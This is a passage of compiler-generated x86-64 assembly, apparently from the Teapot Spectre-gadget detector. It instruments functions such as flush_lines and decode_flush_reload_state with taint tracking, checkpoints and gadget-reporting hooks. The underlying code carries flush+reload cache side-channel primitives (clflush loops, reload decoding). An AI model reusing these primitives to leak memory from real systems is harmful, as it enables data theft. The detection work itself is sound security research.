            movzbq (dift_reg_queued_id),%r13
            orb %bpl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___229:

            nop
            popq %rbp
            movq %rax,(scratchpad+524288)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r13d,%r13d
            orb (%rax),%r13b
            movb %r13b,(dift_reg_tags+12)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___230

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%r12
            orb %r13b,(dift_reg_tags)(%r12)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___230:

            nop
            movq (scratchpad+524288),%rax
            popq %r12
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r13d,%r13d
            orb (%rax),%r13b
            movb %r13b,(dift_reg_tags+13)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___231

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rbx
            orb %r13b,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___231:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %r13
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $7,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___234

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___234:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_1472__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $98,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___236:

            nop
            leaq (.L_2015)(%rip),%rdi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq perror@PLT
.L__ret_transform_target_otherArray_init__0d85d26e_8f72_49cf_9e08_7eb0dc2322cc__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $92,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%r12
            addq $1,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            jmp .L_1464__teapot__
.size otherArray_init__teapot__, . - otherArray_init__teapot__
random_char__teapot__:
.L__indbr_transform_target_random_char__2257313e_2203_45cc_8bda_37d09ce90e24__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rsp,%rcx
            shrq $3,%rcx
            leaq 2147450880(%rcx),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movb $255,(%rcx)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $80,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___243:

            nop
            movq (scratchpad+524288),%rbx
            movl $90,%eax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___246

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___246:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size random_char__teapot__, . - random_char__teapot__
csel__teapot__:
.L__indbr_transform_target_csel__910821e3_3a21_4274_94f8_869f25df71ab__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rsp,%rcx
            shrq $3,%rcx
            leaq 2147450880(%rcx),%rcx
            movq (memory_history_top),%rbx
            movq (%rcx),%rax
            movq %rcx,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movb $255,(%rcx)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $81,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+5),%al
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___249:

            nop
            movq (scratchpad+524288),%rbx
            movq %rdi,%rax
            movzbl %dl,%edx
            movq %rax,(scratchpad+524288)
            xorl %edi,%edi
            orb (dift_reg_tags+3),%dil
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___250:

            nop
            movq (scratchpad+524288),%rax
            movq %rdx,%rdi
            negq %rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            orb (dift_reg_tags+5),%bl
            movb %bl,(dift_reg_tags+5)
.L__dift_done__teapot___251:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            andq %rax,%rdi
            subq $1,%rdx
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+3),%al
            orb (dift_reg_tags+4),%al
            movb %al,(dift_reg_tags+3)
.L__dift_done__teapot___252:

            nop
            movq (scratchpad+524288),%rbx
            andq %rsi,%rdx
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+5),%al
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___253:

            nop
            movq (scratchpad+524288),%rbx
            movq %rdi,%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            orb (dift_reg_tags+3),%bl
            movb %bl,(dift_reg_tags)
.L__dift_done__teapot___254:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            orq %rdx,%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $11,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___257

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___257:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size csel__teapot__, . - csel__teapot__
flush_lines__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $10,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+3),%al
            orb (dift_reg_tags+3),%al
            testb $48,%al
            je .L__check_ok__teapot___260

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___260:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            testq %rdx,%rdx
            movq %rax,(scratchpad)
            leaq (.__trampoline__2e1eb74e_d668_4c69_8752_a770c9707337__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___262)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__2e1eb74e_d668_4c69_8752_a770c9707337__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___262:

            nop
            je .L_14c8__teapot__
.L__trampoline_target__7bf83f7d_95bc_42bc_b352_29737188d410__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $11,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rbx,(scratchpad+524288)
            xorl %eax,%eax
            movb %al,(dift_reg_tags)
.L__dift_done__teapot___264:

            nop
            movq (scratchpad+524288),%rbx
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movl $0,%eax
.L_14b9__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $12,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            clflush (%rdi)
            addq $1,%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %ebx,%ebx
            orb (dift_reg_tags+5),%bl
            orb (dift_reg_tags+4),%bl
            movb %bl,(dift_reg_tags+5)
.L__dift_done__teapot___267:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            addq %rsi,%rdi
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+3),%al
            orb (dift_reg_tags),%al
            testb $48,%al
            je .L__check_ok__teapot___268

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___268:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $5,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            cmpq %rax,%rdx
            movq %rax,(scratchpad)
            leaq (.__trampoline__345bb64b_5d5d_4273_b3ab_6de102c2ffed__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___270)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__345bb64b_5d5d_4273_b3ab_6de102c2ffed__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___270:

            nop
            jne .L_14b9__teapot__
.L_14c8__teapot__:
.L__trampoline_target__a998571d_2e05_43e3_8417_265288cd7085__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $13,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___274

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___274:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size flush_lines__teapot__, . - flush_lines__teapot__
decode_flush_reload_state__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $0,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            xorl %edx,%edx
            orb (dift_reg_tags+14),%dl
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdx,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___277:

            nop
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r14
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %r14d,%r14d
            orb (dift_reg_tags+13),%r14b
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%r14
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %r14,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___279:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%r14
            movq %rbx,(%rax)
            movq %r14,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %r13
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %r14d,%r14d
            orb (dift_reg_tags+12),%r14b
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%r13
            imulq %r13,%r14
            movq (memory_history_top),%rax
            movq (%rbx),%r13
            movq %rbx,(%rax)
            movq %r13,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %r14,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___281:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            leaq -8(%rsp),%r13
            movq (memory_history_top),%rax
            movq (%r13),%r14
            movq %r13,(%rax)
            movq %r14,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524288),%rax
            pushq %r12
            movq %rax,(scratchpad+524288)
            xorl %r14d,%r14d
            orb (dift_reg_tags+7),%r14b
            leaq -8(%rsp),%r12
            btcq $45,%r12
            movabsq $72340172838076673,%r13
            imulq %r13,%r14
            movq (memory_history_top),%rax
            movq (%r12),%r13
            movq %r12,(%rax)
            movq %r13,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %r14,(%r12)
            addq $8,%r12
.L__dift_done__teapot___283:

            nop
            movq (scratchpad+524288),%rax
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%r14
            movq %r13,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            pushq %rbp
            xorl %r14d,%r14d
            orb (dift_reg_tags+1),%r14b
            leaq -8(%rsp),%r13
            btcq $45,%r13
            movabsq $72340172838076673,%rbp
            imulq %rbp,%r14
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r14,(%r13)
            addq $8,%r13
.L__dift_done__teapot___285:

            nop
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            pushq %rbx
            xorl %r14d,%r14d
            orb (dift_reg_tags+5),%r14b
            movb %r14b,(dift_reg_tags+14)
.L__dift_done__teapot___287:

            nop
            movq %rdi,%r14
            xorl %r12d,%r12d
            orb (dift_reg_tags+3),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___288

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___288:

            nop
            movq (instruction_cnt),%r12
            addq $9,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            cmpq $1,%rdx
            leaq (.__trampoline__eb026ad7_5c62_47cd_bd9e_40636ce4cc33__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___290)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__eb026ad7_5c62_47cd_bd9e_40636ce4cc33__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___290:

            nop
            jbe .L_1522__teapot__
.L__trampoline_target__04354667_8e45_4662_aa56_d51939b5c969__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $8,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___292:

            nop
            movl $1,%eax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+12)
.L__dift_done__teapot___293:

            nop
            movl $0,%r12d
            xorl %ebp,%ebp
            movb %bpl,(dift_reg_tags+7)
.L__dift_done__teapot___294:

            nop
            movl $0,%ebp
            xorl %ecx,%ecx
            movb %cl,(dift_reg_tags+13)
.L__dift_done__teapot___295:

            nop
            movl $0,%r13d
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+1)
.L__dift_done__teapot___296:

            nop
            movl $0,%ebx
            movq (instruction_cnt),%rcx
            addq $6,%rcx
            cmpq $250,%rcx
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rcx,(instruction_cnt)
            jmp .L_150c__teapot__
.L_14fb__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $7,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            addq $1,%rax
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+3),%al
            orb (dift_reg_tags),%al
            testb $48,%al
            je .L__check_ok__teapot___299

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___299:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            cmpq %rax,%rdx
            movq %rax,(scratchpad)
            leaq (.__trampoline__29240a47_21b8_4aff_ab54_968a7ab4cd25__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___301)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__29240a47_21b8_4aff_ab54_968a7ab4cd25__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___301:

            nop
            jbe .L_1538__teapot__
.L__trampoline_target__138b325c_5fe9_4a1a_b86e_20f81eb2c3da__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $6,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags),%al
            testb $48,%al
            je .L__check_ok__teapot___303

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___303:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $2,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            cmpq $255,%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__d9a78565_f49e_4370_ab42_4fcc3f4c2076__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___305)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__d9a78565_f49e_4370_ab42_4fcc3f4c2076__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___305:

            nop
            ja .L_1538__teapot__
.L__trampoline_target__ae20bfba_6a9b_4b3c_9285_d5eeec099e7e__teapot__:
.L_150c__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $3,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsi,%rax,8),%rbx
            xorq %rax,%rax
            orb (dift_reg_tags+4),%al
            orb (dift_reg_tags),%al
            testb $48,%al
            je .L__attacker_tags_check__teapot___307

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rbx,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___307:

            testb $2,%al
            je .L__asan_check__teapot___307

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rbx,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
.L__asan_check__teapot___307:

            movq %rbx,%rcx
            shrq $3,%rcx
            movb 2147450880(%rcx),%cl
            testb %cl,%cl
            je .L__mem_operand_policy_done__teapot___307
.L__asan_check_fail__teapot___307:

            testb $1,%al
